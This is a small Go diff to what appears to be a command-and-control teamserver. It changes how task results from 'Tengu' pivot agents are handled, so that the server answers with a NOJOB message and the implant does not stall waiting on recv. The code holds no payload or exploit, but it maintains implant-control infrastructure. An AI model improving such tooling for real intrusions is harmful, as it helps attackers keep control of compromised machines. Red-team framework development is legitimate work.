@@ -1249,14 +1249,15 @@ func TenguHandlePivotFrame(teamserver TeamServer, Header Header) []byte {
 		}
 		payload = BuildTenguMessage(jobs)
 	} else {
-		/* Task result - no response body needed. */
+		/* Task result - dispatch and reply with NOJOB so the Tengu doesn't
+		   block on recv for 120s waiting for a response that never comes. */
 		if Header.Data.CanIRead([]parser.ReadType{parser.ReadBytes}) {
 			resultData := Header.Data.ParseBytes()
 			Agent.TenguTaskDispatch(RequestID, Command, parser.NewParser(resultData), teamserver)
 		} else {
 			Agent.TenguTaskDispatch(RequestID, Command, parser.NewParser([]byte{}), teamserver)
 		}
-		return nil
+		payload = BuildTenguMessage([]Job{{Command: COMMAND_NOJOB}})
 	}
 
 	/* Encrypt the response if the session has a ChaCha20 key. */
